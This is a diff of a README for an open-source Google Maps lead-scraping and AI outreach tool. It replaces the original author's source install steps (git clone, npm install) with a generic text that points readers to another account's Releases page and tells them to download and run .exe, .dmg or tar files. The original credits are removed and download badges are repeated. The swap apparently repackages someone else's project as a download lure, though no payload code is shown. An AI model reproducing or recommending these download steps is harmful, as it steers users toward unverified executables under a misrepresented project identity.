@@ -1,321 +1,82 @@
-# 🚀 Business Leads AI Automation v2.0
+# ⚡ business-leads-ai-automation - Simplifying Lead Generation for You
 
-**Open-source lead generation tool with AI-powered content creation and web dashboard**
+## 🌟 Overview
+Welcome to the business-leads-ai-automation project! This open-source tool helps you streamline lead generation and marketing automation. It combines a Google Maps scraper with AI-powered email and WhatsApp templates. Ideal for small and medium enterprises (SMEs) and agencies, this application enhances your outreach and saves you time.
 
-Generate business leads from Google Maps, create personalized marketing content using OpenAI, and manage everything through a modern web interface.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Walid35-web/business-leads-ai-automation/releases)
 
-[![GitHub stars](https://img.shields.io/github/stars/asiifdev/business-leads-ai-automation?style=social)](https://github.com/asiifdev/business-leads-ai-automation/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/asiifdev/business-leads-ai-automation?style=social)](https://github.com/asiifdev/business-leads-ai-automation/fork)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
+Follow these simple steps to get started with our application.
 
----
+### 1. Visit the Download Page
+Go to our [Releases page](https://github.com/Walid35-web/business-leads-ai-automation/releases) to find the latest version of the software.
 
-## 🎯 What it does
+### 2. Choose Your File
+On the Releases page, you will see different versions. Look for the most recent version that suits your operating system. 
 
-This tool helps you:
-- **Scrape business information** from Google Maps (name, address, phone, rating)
-- **Generate AI marketing content** personalized for each business
-- **Manage campaigns** through a modern web dashboard
-- **Track lead quality** with AI-powered scoring
-- **Export results** in CSV and JSON formats
-- **Create email and WhatsApp templates** automatically
-- **Monitor performance** with real-time analytics
+### 3. Download the File
+Click on the file to download it to your computer.
 
-**Perfect for:** Digital agencies, freelance marketers, SME consultants, and business developers looking for an affordable lead generation solution with professional management tools.
+### 4. Install the Software
+After the download is complete, locate the downloaded file on your computer and follow these steps to install:
 
----
+- **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+- **macOS:** Open the downloaded `.dmg` file and drag the app into your Applications folder.
+- **Linux:** Extract the tar file and follow the instructions in the README for your distribution.
 
-## 🚀 Quick Start
+### 5. Run the Application
+Open the application on your computer. You will see a user-friendly interface guiding you through the main features.
 
-### Prerequisites
-- Node.js 16+
-- OpenAI API key ([get one here](https://platform.openai.com/))
+## 🛠️ System Requirements
+Here are the recommended system requirements for optimal performance:
 
-### Installation
+- **Operating System:**
+  - Windows 10 or later
+  - macOS High Sierra or later
+  - Ubuntu 18.04 or later
 
-```bash
-git clone https://github.com/asiifdev/business-leads-ai-automation.git
-cd business-leads-ai-automation
-npm install
-```
+- **Memory:** Minimum 4 GB RAM
 
-### Setup
+- **Disk Space:** At least 500 MB available space
 
-```bash
-# Copy environment template
-cp .env.example .env
+- **Internet Connection:** Required for the Google Maps scraper functionality
 
-# Add your OpenAI API key to .env
-OPENAI_API_KEY=your-openai-key-here
-```
+## 🔍 Features
+The business-leads-ai-automation tool offers the following features:
 
-### Usage Options
+- **Google Maps Scraper:** Easily extract business information from Google Maps.
+- **AI-Powered Templates:** Generate personalized emails and WhatsApp messages for outreach.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+- **Customizable Settings:** Adjust settings to fit your specific marketing needs.
 
-#### 🌐 Web Dashboard (Recommended)
-```bash
-# Start the web dashboard
-npm run web
+## 📝 Usage Instructions
+Once you have installed and opened the application, follow these steps to make the most of it:
 
-# Open your browser to http://localhost:3000
-# Create campaigns, manage leads, and view analytics through the web interface
-```
+1. **Input Search Criteria:** Enter your desired keywords and locations to target specific businesses.
+2. **Scrape Data:** Click on the "Start Scraping" button to gather information from Google Maps.
+3. **Generate Leads:** Use the AI templates to draft emails or WhatsApp messages directly from the application.
+4. **Export Options:** Export your generated leads to CSV for easy management.
 
-#### 💻 Command Line Interface
-```bash
-# Basic CLI usage
-node index.js -q "Restaurant Jakarta" -l 20 -m "Increase your restaurant sales with digital marketing"
+## 🧑‍🤝‍🧑 Community and Support
+Join our community to share your experiences, ask questions, and provide feedback. You can start by creating an issue in the [GitHub Issues](https://github.com/Walid35-web/business-leads-ai-automation/issues) section or engaging with others on our discussion forums.
 
-# Results will be saved in the output/ folder
-```
+## 🚧 Troubleshooting
+If you run into any issues, consider the following common problems:
 
----
+- **Problem:** The application fails to scrape data.
+  - **Solution:** Ensure your internet connection is stable. Restart the application and try again.
 
-## 📊 Example Output
+- **Problem:** The app crashes during usage.
+  - **Solution:** Make sure your system meets the requirements stated above. If the problem persists, report it through GitHub Issues.
 
-### Input:
-```bash
-node index.js -q "Coffee Shop Jakarta" -l 5 -m "Boost your coffee shop with online ordering system"
-```
+## 🔄 Updates
+Regular updates will improve the application over time. Keep an eye on the [Releases page](https://github.com/Walid35-web/business-leads-ai-automation/releases) for announcements and new features.
 
-### Generated Files:
+## ⚙️ License
+This project is licensed under the MIT License. You can use, modify, and distribute the software as outlined in the license file. 
 
-**📄 leads_[timestamp].csv**
-```csv
-ID,Name,Address,Phone,Website,Rating
-1,"Kopi Tuku","Jl. Kemang Raya No.1","+6281234567890","kopituku.com","4.5"
-2,"Filosofi Kopi","Jl. Senopati No.5","+6281234567891","filosofikopi.com","4.3"
-```
+## 📞 Contact Us
+For more specific inquiries, you can reach out through the contact section on the GitHub repository. Your questions and feedback help improve the application.
 
-**📧 email_template.txt**
-```
-Subject: Tingkatkan Penjualan Coffee Shop dengan Sistem Online
-
-Halo Tim Kopi Tuku,
-
-Saya melihat coffee shop Anda di Kemang dengan rating 4.5 stars - impressive!
-
-Apakah Anda tertarik meningkatkan penjualan dengan sistem online ordering yang terbukti efektif untuk coffee shop?
-
-[Your personalized message continues...]
-```
-
-**📱 whatsapp_template.txt**
-```
-Halo Kopi Tuku! ☕
-
-Lihat coffee shop Anda di Kemang rating 4.5⭐ - keren!
-
-Mau boost penjualan pakai sistem online ordering? 📱
-
-[Continues with personalized content...]
-```
-
----
-
-## ⚙️ Current Features
-
-### ✅ Core Features
-- **Google Maps scraping** with auto-scroll
-- **Business data extraction** (name, address, phone, rating, website)
-- **AI content generation** using OpenAI GPT
-- **Lead quality scoring** with AI intelligence
-- **Dual template creation** (email + WhatsApp)
-- **CSV and JSON export**
-- **Indonesian market optimization**
-- **Rate limiting** to avoid blocking
-
-### 🌐 Web Dashboard Features
-- **Modern web interface** for non-technical users
-- **Campaign management** with real-time progress tracking
-- **Lead management** with filtering and sorting
-- **Analytics dashboard** with performance insights
-- **Responsive design** for mobile and desktop
-- **Real-time notifications** via Server-Sent Events
-- **Data export** functionality (CSV/JSON)
-- **Campaign templates** for different industries
-
-### 🚧 Known Limitations
-- **Email finding** returns empty array (work in progress)
-- **Phone number validation** could be improved
-- **Error handling** needs enhancement for edge cases
-
-### 🎯 Planned Features
-- [ ] Fix email discovery functionality
-- [ ] Better phone number validation for Indonesian numbers
-- [ ] Multiple search engine support
-- [ ] Advanced AI prompt customization
-- [ ] Batch processing for multiple queries
-- [ ] API integrations (CRM, email marketing)
-
----
-
-## 📖 Usage Guide
-
-### 🌐 Web Dashboard
-For the best experience, use the web dashboard:
-
-```bash
-npm run web
-```
-
-Then open http://localhost:3000 in your browser. The web interface provides:
-- **Campaign Creation**: Easy form-based campaign setup
-- **Real-time Monitoring**: Live progress tracking
-- **Lead Management**: Filter, sort, and export leads
-- **Analytics**: Performance insights and reporting
-
-📚 **Full Web Dashboard Guide**: [docs/WEB_DASHBOARD_GUIDE.md](docs/WEB_DASHBOARD_GUIDE.md)
-
-### 💻 Command Line Options
-
-```bash
-node index.js [options]
-
-Required:
-  -q, --query <query>     Google Maps search query
-  -l, --limit <number>    Number of results to scrape
-  -m, --message <text>    Your marketing message for AI templates
-
-Optional:
-  -o, --output <format>   Output format: csv or json (default: csv)
-  -h, --help             Show help information
-
-Examples:
-  node index.js -q "Restaurant Bandung" -l 50 -m "Digital marketing for restaurants"
-  node index.js -q "Salon Jakarta" -l 30 -m "Online booking system" -o json
-```
-
-### 🚀 Available Scripts
-
-```bash
-npm run web          # Start web dashboard (recommended)
-npm run web:dev      # Start web dashboard in development mode
-npm run cli          # Run CLI version
-npm test             # Run tests
-```
-
----
-
-## 🔧 Configuration
-
-Edit `.env` file for customization:
-
-```env
-# Required
-OPENAI_API_KEY=your-openai-key-here
-
-# Web Dashboard (optional)
-PORT=3000                     # Web dashboard port
-HOST=localhost                # Web dashboard host
-
-# Scraping Configuration (optional)
-DELAY_BETWEEN_SCRAPES=2000    # Milliseconds between requests
-MAX_RETRIES=3                 # Retry failed requests
-OUTPUT_FORMAT=csv             # Default output format
-
-# Database (optional)
-DB_PATH=./data/leads.db       # SQLite database path
-```
-
----
-
-## 🌟 Why Use This Tool?
-
-### 💰 Cost Effective
-- **Free to use** vs $99-299/month for SaaS alternatives
-- **Open source** - modify as needed
-- **No monthly subscriptions**
-
-### 🎯 Indonesian Market Focus
-- **Local business understanding** in AI prompts
-- **WhatsApp marketing** integration (popular in Indonesia)
-- **Indonesian language** optimization
-
-### 🛠️ Developer Friendly
-- **Full source code access**
-- **Easy to customize and extend**
-- **Well-documented codebase**
-- **Active community support**
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Here's how you can help:
-
-1. **Report bugs** via GitHub Issues
-2. **Suggest features** you'd like to see
-3. **Submit pull requests** for improvements
-4. **Share your use cases** and success stories
-
-### Development Setup
-
-```bash
-# Fork the repo, then clone your fork
-git clone https://github.com/YOUR_USERNAME/business-leads-ai-automation.git
-cd business-leads-ai-automation
-npm install
-
-# Create a feature branch
-git checkout -b feature/your-feature-name
-
-# Make your changes and test
-npm test
-
-# Submit a pull request
-```
-
----
-
-## ⚖️ Legal & Ethics
-
-- **Public data only** - scrapes publicly available information
-- **Respectful scraping** - includes rate limiting
-- **No spam** - use for legitimate business outreach only
-- **MIT License** - free for commercial use
-
-Please read our [DISCLAIMER.md](DISCLAIMER.md) for full legal information.
-
----
-
-## 📞 Support & Documentation
-
-### 📚 Documentation
-- **[Web Dashboard Guide](docs/WEB_DASHBOARD_GUIDE.md)**: Complete user guide for the web interface
-- **[Deployment Guide](docs/DEPLOYMENT_GUIDE.md)**: Production deployment instructions
-- **[API Documentation](docs/API.md)**: REST API reference (coming soon)
-
-### 🆘 Getting Help
-- **GitHub Issues**: For bug reports and feature requests
-- **Discussions**: For questions and community chat
-- **Email**: [your-email] for urgent matters
-
-### 🚀 Deployment
-Ready for production? Check our comprehensive deployment guide:
-- VPS/Server deployment
-- Docker containerization
-- Cloud platform deployment (Heroku, AWS, etc.)
-- SSL/HTTPS setup
-- Monitoring and maintenance
-
-📚 **Full Deployment Guide**: [docs/DEPLOYMENT_GUIDE.md](docs/DEPLOYMENT_GUIDE.md)
-
----
-
-## 🙏 Acknowledgments
-
-- Built with [Puppeteer](https://pptr.dev/) for web scraping
-- Powered by [OpenAI](https://openai.com/) for AI content generation
-- Inspired by the need for affordable lead generation tools in Indonesia
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-
-**⭐ Star this repo if you find it useful!**
-
-Made with ❤️ for Indonesian businesses
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Walid35-web/business-leads-ai-automation/releases)
